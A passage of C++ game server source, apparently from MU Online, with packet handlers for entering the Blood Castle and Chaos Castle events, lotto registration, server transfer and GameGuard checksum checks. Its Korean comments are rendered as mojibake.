		DataSend(iIndex, (LPBYTE)&pResult, pResult.h.size);
	}
	else if( gObj[iIndex].pInventory[btInvisibleCourtItemPos].m_Type == MAKE_ITEMNUM( 13, 47 )
		&& gObj[iIndex].pInventory[btInvisibleCourtItemPos].m_Durability > 1
		)
	{
		gObj[iIndex].pInventory[btInvisibleCourtItemPos].m_Durability--;

		GCItemDurSend2( iIndex, btInvisibleCourtItemPos, gObj[iIndex].pInventory[btInvisibleCourtItemPos].m_Durability, 0 );
	}
#else
	gObjInventoryDeleteItem(iIndex, btInvisibleCourtItemPos);
	GCInventoryItemDeleteSend(iIndex, btInvisibleCourtItemPos, 1);
	DataSend(iIndex, (LPBYTE)&pResult, pResult.h.size);
#endif // ADD_PCS_EVENT_MAP_FREE_TICKET_20070110

	// *> . ������� ���� ĳ������ �ʱ�ȭ
#ifdef USER_ENTER_BLOODCASTLE7_WITH6_20040330
	gObj[iIndex].m_cBloodCastleIndex = btBridgeNumber;
#else
	gObj[iIndex].m_cBloodCastleIndex = iITEM_LEVEL-1;
#endif
	gObj[iIndex].m_cBloodCastleSubIndex = iBC_INDEX;
	gObj[iIndex].m_iBloodCastleEXP = 0;

#ifdef BLOOD_DEVILSQUARE_TRADE_BUG_FIX
	gObj[iIndex].m_IfState.state = 0;	
	gObj[iIndex].m_IfState.type = 0;
	gObj[iIndex].m_IfState.use =  0;
#endif
	// *> . ��Ƽ�� �ΰ� �־��ٸ� ��Ƽ��  ������ Ż���Ŵ
/*	if( gObj[iIndex].PartyNumber >= 0 )
	{
		PMSG_PARTYDELUSER pMsg;
		
		int pindex = gParty.GetIndex(gObj[iIndex].PartyNumber, iIndex, gObj[iIndex].DBNumber);
		if( pindex >= 0 )
		{
			pMsg.Number = pindex;
			CGPartyDelUser( &pMsg, iIndex);
		}
	}
*/
	// *> . ������ ����Ͽ� ����Ʈ �����۵��� �����Ѵ�.
	g_BloodCastle.SearchUserDeleteQuestItem(iIndex);

	// *> . ����� ���� ĳ���� �̵�
	CHAR szTemp [256];
#ifdef USER_ENTER_BLOODCASTLE7_WITH6_20040330
	wsprintf(szTemp, lMsg.Get(1171), btBridgeNumber+1);			// "����� �� %d ����ĳ���� ���̽��ϴ�."
#else
	wsprintf(szTemp, lMsg.Get(1171), iITEM_LEVEL);				// "����� �� %d ����ĳ���� ���̽��ϴ�."
#endif
	GCServerMsgStringSend(szTemp, iIndex, 1);

#ifdef BLOODCASTLE_EXTEND_20040314
#ifdef USER_ENTER_BLOODCASTLE7_WITH6_20040330
	if (btBridgeNumber+1 == iITEM_LEVEL) {
		switch(iITEM_LEVEL) {
		case 1 :		// 1ĳ��
			gObjMoveGate(iIndex, GATE_BLOODCASTLE_1);
			break;
		case 2 :		// 2ĳ��
			gObjMoveGate(iIndex, GATE_BLOODCASTLE_2);
			break;
		case 3 :		// 3ĳ��
			gObjMoveGate(iIndex, GATE_BLOODCASTLE_3);
			break;
		case 4 :		// 4ĳ��
			gObjMoveGate(iIndex, GATE_BLOODCASTLE_4);
			break;
		case 5 :		// 5ĳ��
			gObjMoveGate(iIndex, GATE_BLOODCASTLE_5);
			break;
		case 6 :		// 6ĳ��
			gObjMoveGate(iIndex, GATE_BLOODCASTLE_6);
			break;
		case 7 :		// 7ĳ��
			gObjMoveGate(iIndex, GATE_BLOODCASTLE_7);
			break;
		}
	}
	else if (btBridgeNumber+1 == 7 && iITEM_LEVEL == 6) {
		// 7ĳ��
		gObjMoveGate(iIndex, GATE_BLOODCASTLE_7);
	}
#else
	switch(iITEM_LEVEL) {
	case 1 :		// 1ĳ��
		gObjMoveGate(iIndex, GATE_BLOODCASTLE_1);
		break;
	case 2 :		// 2ĳ��
		gObjMoveGate(iIndex, GATE_BLOODCASTLE_2);
		break;
	case 3 :		// 3ĳ��
		gObjMoveGate(iIndex, GATE_BLOODCASTLE_3);
		break;
	case 4 :		// 4ĳ��
		gObjMoveGate(iIndex, GATE_BLOODCASTLE_4);
		break;
	case 5 :		// 5ĳ��
		gObjMoveGate(iIndex, GATE_BLOODCASTLE_5);
		break;
	case 6 :		// 6ĳ��
		gObjMoveGate(iIndex, GATE_BLOODCASTLE_6);
		break;
	case 7 :		// 7ĳ��
		gObjMoveGate(iIndex, GATE_BLOODCASTLE_7);
		break;
#ifdef ADD_BLOODCASTLE_FOR_MASTER_LEVEL_20071010	// 8ĳ�� �̵�
	case 8 :		// 8ĳ��
		gObjMoveGate(iIndex, GATE_BLOODCASTLE_8);
		break;
#endif	// ADD_BLOODCASTLE_FOR_MASTER_LEVEL_20071010
	}
#endif
#else
	gObjMoveGate(iIndex, GATE_BLOODCASTLE_1 + iITEM_LEVEL - 1);	// �����δ� �ش� �ٸ��� ���Ƿ� �̵�
#endif

#ifdef EXTEND_LOG_SYSTEM_06_20070308
	#ifdef MODIFY_ITEM_SERIAL_EXPAND_20080227
	LogAddTD("[Blood Castle] (%d) (Account:%s, Name:%s) Entered Blood Castle (Invisible Cloak Serial:%u),PCRoom:%d", 
	#else
	LogAddTD("[Blood Castle] (%d) (Account:%s, Name:%s) Entered Blood Castle (Invisible Cloak Serial:%d),PCRoom:%d", 
	#endif // MODIFY_ITEM_SERIAL_EXPAND_20080227
		iITEM_LEVEL, 
		gObj[iIndex].AccountID,
		gObj[iIndex].Name,
		dwITEM_SERIAL,
		gObj[iIndex].m_bPCBangUser
		);
#else
	#ifdef MODIFY_ITEM_SERIAL_EXPAND_20080227
	LogAddTD("[Blood Castle] (%d) (Account:%s, Name:%s) Entered Blood Castle (Invisible Cloak Serial:%u)", 
	#else
	LogAddTD("[Blood Castle] (%d) (Account:%s, Name:%s) Entered Blood Castle (Invisible Cloak Serial:%d)", 
	#endif // MODIFY_ITEM_SERIAL_EXPAND_20080227
		iITEM_LEVEL, 
		gObj[iIndex].AccountID,
		gObj[iIndex].Name,
		dwITEM_SERIAL
		);
#endif // EXTEND_LOG_SYSTEM_06_20070308

#endif

}

#endif


#ifdef CHAOSCASTLE_SYSTEM_20040408		// [0xAF] ī���� ĳ�� ���� �������� ��

// [0xAF][0x01] ����ڰ� ī���� ĳ���� ���� ��û�� �Ѵ�.
void CGRequestEnterChaosCastle(LPPMSG_REQ_MOVECHAOSCASTLE lpMsg, int iIndex)
{
	if (!CHECK_LIMIT(iIndex, MAX_OBJECT))
	{
		LogAdd("return %s %d", __FILE__, __LINE__);
		return;
	}

	BYTE btChaosCastleNumber = lpMsg->iChaosCastleNumber-1;
	BYTE btGuardMailSetItemPos = lpMsg->iItemPos;
	INT	 iITEM_LEVEL = 0;
	DWORD dwITEM_SERIAL = 0;

	PMSG_RESULT_MOVECHAOSCASTLE pResult;
	PHeadSubSetB((LPBYTE)&pResult, 0xAF, 0x01, sizeof(pResult));
	pResult.Result = 0;

	if ((gObj[iIndex].Type != OBJTYPE_CHARACTER) || (gObj[iIndex].Connected <= 2)) {
		return;
	}

	// *> . �� �� ���� ������ üũ�Ѵ�.
	if (CHECK_BLOODCASTLE(gObj[iIndex].MapNumber) ||		// ����ĳ��
		CHECK_CHAOSCASTLE(gObj[iIndex].MapNumber) ||		// ī����ĳ��
#ifdef DEVILSQUARE_EXTEND_20050221		// ���������� �ʹ�ȣ üũ ����
		CHECK_DEVILSQUARE(gObj[iIndex].MapNumber)			// ����������
#else
		gObj[iIndex].MapNumber == 9							// ����������
#endif
		)
	{
		PMSG_NOTICE	pNotice;
#ifdef MODIFY_NOTICE_20040325
		TNotice::MakeNoticeMsgEx( &pNotice, 1, lMsg.Get(1224));		// "ī���� ĳ���� ������ �� ���� �����Դϴ�."
#else
		pNotice.type = 1;
		wsprintf(pNotice.Notice, lMsg.Get(1224));					// "ī���� ĳ���� ������ �� ���� �����Դϴ�."
		PHeadSetB((LPBYTE)&pNotice, 0x0D, 4+(strlen(pNotice.Notice)+1));
#endif
		DataSend(iIndex, (LPBYTE)&pNotice, pNotice.h.size);

		return;
	}


	// *> . ���� �������̽��� ��� ������ üũ�Ѵ�.
	if (gObj[iIndex].m_IfState.use != 0 && gObj[iIndex].m_IfState.type != I_ETCWINDOW ) {
		return;
	}


#ifdef ADD_PK_LIMIT_FREE_OPTION_20050324
	if (!gPkLimitFree) {
#endif
	// *> . ������ ������ ����ڴ� ������ �� ����.
#ifdef UPDATE_PK_SYSTEM_20070302	// ī�� ������ ������ �� ����.
	BOOL	PKFlag = FALSE;
	if(gObj[iIndex].PartyNumber >= 0)	// ��Ƽ�� ���Ұ��
	{
		if( gParty.GetPKPartyPenalty(gObj[iIndex].PartyNumber) >= PK_LEVEL_DEFAULT+3)
		{
			PKFlag = TRUE;
		}
	}
	else
	{
		if(gObj[iIndex].m_PK_Level >= PK_LEVEL_DEFAULT+3)
		{
			PKFlag = TRUE;
		}
	}
	
	if(PKFlag == TRUE) {
#else	// UPDATE_PK_SYSTEM_20070302
	if (gObj[iIndex].m_PK_Level >= PK_LEVEL_DEFAULT+3) {
#endif	// UPDATE_PK_SYSTEM_20070302
		PMSG_NOTICE	pNotice;
#ifdef MODIFY_NOTICE_20040325
		TNotice::MakeNoticeMsgEx( &pNotice, 1, lMsg.Get(1225));		// "�����ڴ� ī���� ĳ���� ������ �� �����ϴ�."
#else
		pNotice.type = 1;
		wsprintf(pNotice.Notice, lMsg.Get(1225));					// "�����ڴ� ī���� ĳ���� ������ �� �����ϴ�."
		PHeadSetB((LPBYTE)&pNotice, 0x0D, 4+(strlen(pNotice.Notice)+1));
#endif
		DataSend(iIndex, (LPBYTE)&pNotice, pNotice.h.size);
		return;
	}
#ifdef ADD_PK_LIMIT_FREE_OPTION_20050324
	}
#endif
	

	// *> . ���� ������ ����ڴ� ������ �� ����.
	if (gObjDuelCheck(&gObj[iIndex]) == TRUE) {
		PMSG_NOTICE	pNotice;
#ifdef MODIFY_NOTICE_20040325
		TNotice::MakeNoticeMsgEx( &pNotice, 1, lMsg.Get(1226));		// "���� �߿����� ī���� ĳ���� ������ �� �����ϴ�."
#else
		pNotice.type = 1;
		wsprintf(pNotice.Notice, lMsg.Get(1226));					// "���� �߿����� ī���� ĳ���� ������ �� �����ϴ�."
		PHeadSetB((LPBYTE)&pNotice, 0x0D, 4+(strlen(pNotice.Notice)+1));
#endif
		DataSend(iIndex, (LPBYTE)&pNotice, pNotice.h.size);
		return;
	}
	

	// *> . ����� ������ ����ڴ� ������ �� ����.
	if (gObj[iIndex].lpGuild && gObj[iIndex].lpGuild->WarState == 1) {
		PMSG_NOTICE	pNotice;
#ifdef MODIFY_NOTICE_20040325
		TNotice::MakeNoticeMsgEx( &pNotice, 1, lMsg.Get(1227));		// "����� �߿��� ī���� ĳ���� ���� �� �� �����ϴ�."
#else
		pNotice.type = 1;
		wsprintf(pNotice.Notice, lMsg.Get(1227));					// "����� �߿��� ī���� ĳ���� ���� �� �� �����ϴ�."
		PHeadSetB((LPBYTE)&pNotice, 0x0D, 4+(strlen(pNotice.Notice)+1));
#endif
		DataSend(iIndex, (LPBYTE)&pNotice, pNotice.h.size);
		return;
	}
	

	// *> . ī���� ĳ�������� ���ϸ��� �� ����Ʈ�� ������ �� ����.
	if( gObj[iIndex].pInventory[EQUIPMENT_HELPER].m_Type == MAKE_ITEMNUM(13,3) ||		// ���ϸ���
		gObj[iIndex].pInventory[EQUIPMENT_HELPER].m_Type == MAKE_ITEMNUM(13,2) 			// ����Ʈ
		
#ifdef ADD_ITEM_FENRIR_01_20051110
		|| gObj[iIndex].pInventory[EQUIPMENT_HELPER].m_Type == MAKE_ITEMNUM(13,37) 			// �渱
		// ī���� ĳ�������� �渱 ���� �� �� ����.
#endif
	  )

	{	
		PMSG_NOTICE	pNotice;
#ifdef MODIFY_NOTICE_20040325
		TNotice::MakeNoticeMsgEx( &pNotice, 1, lMsg.Get(1228));		// "Ż���� �����ϰ� ������ ī���� ĳ���� �̵��� �� �����ϴ�."
#else
		pNotice.type = 1;
		wsprintf(pNotice.Notice, lMsg.Get(1228));					// "Ż���� �����ϰ� ������ ī���� ĳ���� �̵��� �� �����ϴ�."
		PHeadSetB((LPBYTE)&pNotice, 0x0D, 4+(strlen(pNotice.Notice)+1));
#endif
		DataSend(iIndex, (LPBYTE)&pNotice, pNotice.h.size);
		return;
	}						

#ifdef ADD_PK_USER_ENTER_LIMIT_EVENT_MAP_20060411
	// *> . ī�� ������ ������ �� ����.	
#ifdef UPDATE_PK_SYSTEM_20070302	// ī�� ������ ������ �� ����.
	BOOL	PKFlag = FALSE;
	if(gObj[iIndex].PartyNumber >= 0)	// ��Ƽ�� ���Ұ��
	{
		if( gParty.GetPKPartyPenalty(gObj[iIndex].PartyNumber) >= PK_LEVEL_DEFAULT+2)
		{
			PKFlag = TRUE;
		}
	}
	else
	{
		if(gObj[iIndex].m_PK_Level >= PK_LEVEL_DEFAULT+1)
		{
			PKFlag = TRUE;
		}
	}
	
	if(PKFlag == TRUE)
#else	// UPDATE_PK_SYSTEM_20070302
	if( gObj[iIndex].m_PK_Level >= PK_LEVEL_DEFAULT + 1 )
#endif	// UPDATE_PK_SYSTEM_20070302
	{
		pResult.Result = 8;
		DataSend( iIndex, (LPBYTE)&pResult, pResult.h.size );
		return;
	}
#endif

	// 1 . �ڽ��� ������ �´� �𵥵� ĳ���� ã�´�.
	INT iENTER_LEVEL = g_ChaosCastle.GetUserLevelToEnter(iIndex);
	if (iENTER_LEVEL == -1) {
		pResult.Result = 1;
		DataSend(iIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}


	// 2 . ������ �� �� �ִ� �ð����� Ȯ���Ѵ�.
#ifdef PCBANG_EVENT_FREE_CHAOSCASTLE_20060307
	if( !g_ChaosCastle.CheckCanEnter( iIndex, iENTER_LEVEL ) ) {
#else
	if (!g_ChaosCastle.CheckCanEnter(iENTER_LEVEL)) {
#endif	
		pResult.Result = 2;
		DataSend(iIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}


	// 3 . �ɸ����� �κ��� �ش� ��ġ�� �������� ���ʼ�Ʈ �������� �ִ��� Ȯ���Ѵ�.
	if( gObj[iIndex].pInventory[btGuardMailSetItemPos].IsItem() == TRUE )
	{
		if( gObj[iIndex].pInventory[btGuardMailSetItemPos].m_Type == MAKE_ITEMNUM(13, 29) )	// �������� ���ʼ�Ʈ�� �����Ѵٸ�
		{
			iITEM_LEVEL = gObj[iIndex].pInventory[btGuardMailSetItemPos].m_Level;				// ������ ������ ��´�.
			dwITEM_SERIAL = gObj[iIndex].pInventory[btGuardMailSetItemPos].m_Number;			// ������ �ø����� ��´�.
/*
			if (!CHECK_LIMIT(iITEM_LEVEL, MAX_CHAOSCASTLE_COUNT+1)) {						// 0 < iITEM_LEVEL < �ִ� ĳ������ + 1
				pResult.Result = 1;
				DataSend(iIndex, (LPBYTE)&pResult, pResult.h.size);
				return;
			}
*/
		}
		else {
			pResult.Result = 1;
			DataSend(iIndex, (LPBYTE)&pResult, pResult.h.size);
			return;
		}
	}
	else {
		pResult.Result = 1;
		DataSend(iIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}

	
	// 3 . �������� �����ϹǷ� ���� �ش� �ɸ��� ������ �´��� Ȯ���Ѵ�.
/*
	INT iRESULT = g_ChaosCastle.CheckEnterLevel(iIndex, iITEM_LEVEL);

	if (!iRESULT) {					// ������ �´�.
		pResult.Result = 0;
		DataSend(iIndex, (LPBYTE)&pResult, pResult.h.size);
	}
	else if (iRESULT == -1) {		// �� ������ ����.
		pResult.Result = 4;
		DataSend(iIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}
	else if (iRESULT == 1) {		// �� ������ ����.
		pResult.Result = 3;
		DataSend(iIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}
	else return;					// �ٸ� ������.
*/


	// 4 . ����ڰ� ���Ź����� �����ϰ� �ִ��� Ȯ���Ѵ�.
	if (g_ChaosCastle.CheckWearingMOPH(iIndex) == TRUE) {
		GCServerMsgStringSend(lMsg.Get(1229), iIndex, 1);			// "ī���� ĳ���� ���Ź����� �����ϰ� �����Ͻ� �� �����ϴ�."
		return;
	}

#ifdef MODIFY_ENTER_CHOSCASTLE_BUGFIX_20070316
	BYTE btMapAttr = MapC[gObj[iIndex].MapNumber].GetAttr(gObj[iIndex].X, gObj[iIndex].Y);
	if ((btMapAttr&MAP_ATTR_SAFTYZONE)!=MAP_ATTR_SAFTYZONE)		// ��������
	{
		return;
	}
#endif

#ifdef PCBANG_EVENT_FREE_CHAOSCASTLE_20060307
	// 5 . �ش� ĳ���� �ο����ѿ� �ɸ��� �ʴ��� Ȯ���Ѵ�.
	INT iBC_INDEX = -1;
	if( gObj[iIndex].m_bPCBangFreeChaosCastleUser )		// PC�� ������� ��� ���Ḧ �������� �ʴ´�.
	{		
		iBC_INDEX = g_ChaosCastle.EnterUserChaosCastle( iENTER_LEVEL, iIndex );
		if( iBC_INDEX == -1 ) 
		{
			// �ο��������� ���忡 �����Ͽ���.
			pResult.Result = 5;
			DataSend(iIndex, (LPBYTE)&pResult, pResult.h.size);
			return;
		}
	}
	else										// �Ϲ� ����ڴ� ���Ḧ �����ؾ� �Ѵ�.
	{	
		if( g_ChaosCastle.CheckUserEnterMoney( iIndex, iENTER_LEVEL ) ) 
		{
			iBC_INDEX = g_ChaosCastle.EnterUserChaosCastle( iENTER_LEVEL, iIndex );
			if( iBC_INDEX == -1 ) 
			{
				// �ο��������� ���忡 �����Ͽ���.
				pResult.Result = 5;
				DataSend( iIndex, ( LPBYTE )&pResult, pResult.h.size );
				return;
			}
		}
		else 
		{
			// ���� �����ؼ� ���� ���Ѵ�.
			pResult.Result = 7;
			DataSend( iIndex, ( LPBYTE )&pResult, pResult.h.size );
			return;
		}


		// 6 . ����ڿ��� ����Ḧ ���� ��Ų��.
		BOOL bRES = g_ChaosCastle.PayUserEnterMoney( iIndex, iENTER_LEVEL );
		if( bRES == FALSE ) 
		{
			// ���� �߰��ߴ� �ε����� ���� ����.
			g_ChaosCastle.LeaveUserChaosCastle( iENTER_LEVEL, iIndex );
			pResult.Result = 5;
			DataSend( iIndex, ( LPBYTE )&pResult, pResult.h.size );
			return;
		}
	}
#else	// #ifdef PCBANG_EVENT_FREE_CHAOSCASTLE_20060307
	
	// 5 . �ش� ĳ���� �ο����ѿ� �ɸ��� �ʴ��� Ȯ���Ѵ�.
	INT iBC_INDEX = -1;
	if (g_ChaosCastle.CheckUserEnterMoney(iIndex, iENTER_LEVEL)) {
		iBC_INDEX = g_ChaosCastle.EnterUserChaosCastle(iENTER_LEVEL, iIndex);
		if (iBC_INDEX == -1) {
			// �ο��������� ���忡 �����Ͽ���.
			pResult.Result = 5;
			DataSend(iIndex, (LPBYTE)&pResult, pResult.h.size);
			return;
		}
	}
	else {
		// ���� �����ؼ� ���� ���Ѵ�.
		pResult.Result = 7;
		DataSend(iIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}


	// 6 . ����ڿ��� ����Ḧ ���� ��Ų��.
	BOOL bRES = g_ChaosCastle.PayUserEnterMoney (iIndex, iENTER_LEVEL);
	if (bRES == FALSE) {
		// ���� �߰��ߴ� �ε����� ���� ����.
		g_ChaosCastle.LeaveUserChaosCastle(iENTER_LEVEL, iIndex);
		pResult.Result = 5;
		DataSend(iIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}
#endif	// #ifdef PCBANG_EVENT_FREE_CHAOSCASTLE_20060307

	// !!> ���� -> ������ ���ְ� ����ڸ� ī���� ĳ���� �̵���Ų��.

	// *> . ������ ����
	gObjInventoryDeleteItem(iIndex, btGuardMailSetItemPos);
	GCInventoryItemDeleteSend(iIndex, btGuardMailSetItemPos, 1);
	DataSend(iIndex, (LPBYTE)&pResult, pResult.h.size);

	// *> . ������� ī���� ĳ������ �ʱ�ȭ
	gObj[iIndex].m_cChaosCastleIndex = iENTER_LEVEL;
	gObj[iIndex].m_cChaosCastleSubIndex = iBC_INDEX;

#ifdef BLOOD_DEVILSQUARE_TRADE_BUG_FIX
	gObj[iIndex].m_IfState.state = 0;	
	gObj[iIndex].m_IfState.type = 0;
	gObj[iIndex].m_IfState.use =  0;
#endif

	// *> . ���λ��� ���� ���̾����� ������ ������ ������Ŵ
	if (gObj[iIndex].m_bPShopOpen == true) {
		CGPShopReqClose (iIndex);
	}

	// *> . ��Ƽ�� �ΰ� �־��ٸ� ��Ƽ�� ������ Ż���Ŵ
	if( gObj[iIndex].PartyNumber >= 0 )
	{
		PMSG_PARTYDELUSER pMsg;
		
		int pindex = gParty.GetIndex(gObj[iIndex].PartyNumber, iIndex, gObj[iIndex].DBNumber);
		if( pindex >= 0 )
		{
			pMsg.Number = pindex;
			CGPartyDelUser( &pMsg, iIndex);
		}
	}
	
	// *> . �����̰� ��ȯ���� �ִٸ� ������ ���ֹ���
	if((gObj[iIndex].Class == CLASS_ELF) && (gObj[iIndex].m_RecallMon >= 0))
	{
		GCRecallMonLife(iIndex, 60, 0);
		gObjMonsterCallKill(iIndex);
	}

	// *> . ����� ī���� ĳ���� �̵�
	CHAR szTemp [256];
	wsprintf(szTemp, lMsg.Get(1230), iENTER_LEVEL+1);					// "����� �� %d ī���� ĳ���� ���̽��ϴ�."
	GCServerMsgStringSend(szTemp, iIndex, 1);


	switch(iENTER_LEVEL+1) {
	case 1 :		// 1ĳ��
		gObjMoveGate(iIndex, GATE_CHAOSCASTLE_1);
		break;
	case 2 :		// 2ĳ��
		gObjMoveGate(iIndex, GATE_CHAOSCASTLE_2);
		break;
	case 3 :		// 3ĳ��
		gObjMoveGate(iIndex, GATE_CHAOSCASTLE_3);
		break;
	case 4 :		// 4ĳ��
		gObjMoveGate(iIndex, GATE_CHAOSCASTLE_4);
		break;
	case 5 :		// 5ĳ��
		gObjMoveGate(iIndex, GATE_CHAOSCASTLE_5);
		break;
	case 6 :		// 6ĳ��
		gObjMoveGate(iIndex, GATE_CHAOSCASTLE_6);
		break;
#ifdef ADD_CHAOSCASTLE_FOR_MASTER_LEVEL_20071010	// ī����ĳ��7 �̵�
	case 7 :		// 6ĳ��
		gObjMoveGate(iIndex, GATE_CHAOSCASTLE_7);
		break;
#endif		
	}

#ifdef EXTEND_LOG_SYSTEM_06_20070308
	#ifdef MODIFY_ITEM_SERIAL_EXPAND_20080227
	LogAddTD("[Chaos Castle] (%d) (Account:%s, Name:%s) Entered Chaos Castle (Guard Mail Set Serial:%u) PCRoom:%d", 
	#else
	LogAddTD("[Chaos Castle] (%d) (Account:%s, Name:%s) Entered Chaos Castle (Guard Mail Set Serial:%d) PCRoom:%d", 
	#endif // MODIFY_ITEM_SERIAL_EXPAND_20080227
		iENTER_LEVEL+1, 
		gObj[iIndex].AccountID,
		gObj[iIndex].Name,
		dwITEM_SERIAL,
		gObj[iIndex].m_bPCBangUser
		);
#else
	#ifdef MODIFY_ITEM_SERIAL_EXPAND_20080227
	LogAddTD("[Chaos Castle] (%d) (Account:%s, Name:%s) Entered Chaos Castle (Guard Mail Set Serial:%u)", 
	#else
	LogAddTD("[Chaos Castle] (%d) (Account:%s, Name:%s) Entered Chaos Castle (Guard Mail Set Serial:%d)", 
	#endif // MODIFY_ITEM_SERIAL_EXPAND_20080227
		iENTER_LEVEL+1, 
		gObj[iIndex].AccountID,
		gObj[iIndex].Name,
		dwITEM_SERIAL
		);
#endif // EXTEND_LOG_SYSTEM_06_20070308
}


// [0xAF][0x02] Ŭ���̾�Ʈ�� ����ڰ� �̻��� ��ġ�� ������ �˸���.
void CGRequestRepositionUserInChaosCastle(LPPMSG_REQ_REPOSUSER_IN_CC lpMsg, int aIndex)
{
	if (!gObjIsConnected(aIndex))
		return;

	if (!CHECK_CHAOSCASTLE(gObj[aIndex].MapNumber)) {
		// �ڽ��� �ʿ� �ִ� ������ ��ġ�� �̵���Ų��.
//		gObj[aIndex].DieRegen = 2;		// ������ �ʰ� �������� �ȴ�.
		return;
	}

	if (g_ChaosCastle.ObjSetPosition (aIndex, gObj[aIndex].X, gObj[aIndex].Y) == TRUE) {
		// �����ߴٸ� ������ �о�� �� �ð��� ����Ѵ�.
		gObj[aIndex].m_iChaosCastleBlowTime = GetTickCount();
	}
}


#endif


#ifdef BLOODCASTLE_EVENT_3RD_20040401

// [0x9F] ���� ĳ���� ���� ����Ƚ���� ����ڰ� ��û�� ��
void CGRequestEventEnterCount(LPPMSG_REQ_CL_ENTERCOUNT lpMsg, int aIndex)
{
	if (lpMsg == NULL)
		return;

	switch (lpMsg->btEventType) {
	case 1 :		// ����������
#ifdef DEVILSQUARE_CHECK_ENTERCOUNT_20040715
		EGReqDevilSquareEnterCount	(aIndex);
#endif
		break;
	case 2 :		// ����ĳ��
		EGReqBloodCastleEnterCount	(aIndex);
		break;
#ifdef ADD_SEASON_3_NEW_UI_20071122	// ȯ����� ���� Ƚ����û
	case 3:
		g_IllusionTempleEvent.EGReqIllusionTempleEnterCount(aIndex);
		break;
#endif
	}

}

#endif


#ifdef EVENT_LOTTO

void CGRequestLottoRegister(LPPMSG_REQ_2ANV_LOTTO_EVENT lpMsg, int aIndex)
{
	PMSG_REQ_2ANIV_SERIAL	pMsg;
	PHeadSetB((LPBYTE)&pMsg, 0x08, sizeof(pMsg));

	if (gObj[aIndex].UseEventServer) {
		return;
	}
	else {
		gObj[aIndex].UseEventServer = TRUE;
	}

	pMsg.iINDEX = aIndex;
	pMsg.iMEMB_GUID = gObj[aIndex].DBNumber;
	memcpy (pMsg.szUID, gObj[aIndex].AccountID, 10);	pMsg.szUID[10] = 0;
	memcpy (pMsg.SERIAL1, lpMsg->SERIAL1, 4);			pMsg.SERIAL1[4] = 0;
	memcpy (pMsg.SERIAL2, lpMsg->SERIAL2, 4);			pMsg.SERIAL2[4] = 0;
	memcpy (pMsg.SERIAL3, lpMsg->SERIAL3, 4);			pMsg.SERIAL3[4] = 0;
	 
	DataSendEventChip((char*)&pMsg, sizeof(pMsg));	

	LogAddTD("[Mu_2Anv_Event] [%s][%s] Register Lotto Number (Serial: %s-%s-%s)", 
		   gObj[aIndex].AccountID, gObj[aIndex].Name,
		   pMsg.SERIAL1,
		   pMsg.SERIAL2,
		   pMsg.SERIAL3
		   );
}
	
#endif // EVENT_LOTTO

#ifdef MAP_SERVER_WORK_20041030
void CGReqMoveOtherServer(LPPMSG_REQ_MOVE_OTHERSERVER lpMsg, int aIndex)
{
	if( !gEnableServerDivision )
		return;


	if( gObjIsConnectedGP(aIndex) == FALSE ) 
	{
		LogAddC(LOGC_RED, "error-L3 [%s][%d]", __FILE__,__LINE__);
		return;
	}

	LPOBJECTSTRUCT lpObj = &gObj[aIndex];

	if( lpObj->m_MoveOtherServer )
	{	// �̹� ��û���̴�
		return;
	}

	lpObj->m_MoveOtherServer = TRUE;

	PMSG_DEFRESULT pResult;	
	PHeadSetB((LPBYTE)&pResult, 0x99, sizeof(pResult));

	/*
	if( lpObj->lpGuild )
	{	// ��忡 ���ԵǾ� �ִ� ���¿����� �̵��Ҽ� ����		
		pResult.result = 1;
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		lpObj->m_MoveOtherServer = FALSE;
		LogAddTD("[CharTrasfer] Fail (Guild) [%s][%s]", lpObj->AccountID, lpObj->Name);
		ChatTargetSend(pEventObj, "change@webzen.co.kr�� ����", lpObj->m_Index);
		return;
	}
	*/

	if( gObjJoominCheck(aIndex, lpMsg->LastJoominNumber) == FALSE )	
	{
		pResult.result	   = 0x00;
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		lpObj->m_MoveOtherServer = FALSE;
		LogAddTD("[CharTrasfer] Fail (JoominNumber) [%s][%s]", lpObj->AccountID, lpObj->Name);
		GCServerMsgStringSend("���� �߻��� change@webzen.co.kr�� ������ �ֽñ�ٶ��ϴ�", lpObj->m_Index, 1);
		return;
	}

	// ���������� �����ѹ� �ϰ�
	GJSetCharacterInfo(lpObj, lpObj->m_Index);

	// �������� ��û�� �Ѵ�
	SDHP_CHARACTER_TRANSFER	pCharTransfer;
	PHeadSetB((LPBYTE)&pCharTransfer, 0xCF, sizeof(pCharTransfer));

	pCharTransfer.Number = (short)aIndex;
	memcpy(pCharTransfer.Account, lpObj->AccountID, MAX_IDSTRING);

	cDBSMng.Send((char*)&pCharTransfer, sizeof(pCharTransfer));
	LogAddTD("[CharTrasfer] Request Character Trasfer [%s][%s]", lpObj->AccountID, lpObj->Name);
}
#endif

void GCPacketCheckSumRecv(LPPMSG_PACKETCHECKSUM aRecv, int aIndex)
{
	gPacketCheckSum.AddCheckSum(aIndex, aRecv->funcindex, aRecv->CheckSum);
}

#if defined NPROTECT_GAME_GAURD_FOR_SERVER_VERSION_10_20050411
void GCNPggSendCheckSum(int aIndex, DWORD checksum)
{
	PMSG_NPROTECTGGCHECKSUM pMsg;
	PHeadSetBE((LPBYTE)&pMsg, 0x73, sizeof(pMsg));

	pMsg.CheckSum = checksum;
	DataSend(aIndex, (LPBYTE)&pMsg, sizeof(pMsg));
}

void GCNPggCheckSumRecv(LPPMSG_NPROTECTGGCHECKSUM lpMsg, int aIndex)
{
	LPOBJECTSTRUCT lpObj = &gObj[aIndex];

	if( gObjIsConnected(aIndex) == FALSE ) return;

	LogAddTD("[NPgg] Recv Checksum = %x,AuthValue = %x [%s][%s]", 
				 lpMsg->CheckSum, lpObj->NPggCSAuth.m_dwAuthValue,
				 lpObj->AccountID, lpObj->Name);
	
	if( !lpObj->NPggCSAuth.CheckAuthDword(lpMsg->CheckSum) )
	{	// �߸��� ������. ���� ����
		LogAddTD("[NPgg] Invalid Checksum Detect Checksum = %x,AuthValue = %x [%s][%s]", 
				 lpMsg->CheckSum, lpObj->NPggCSAuth.m_dwAuthValue,
				 lpObj->AccountID, lpObj->Name);


		DWORD dwResults[8];
		lpObj->NPggCSAuth.GetAuthResults(lpObj->NPggCSAuth.m_dwAuthValue, dwResults, 8);

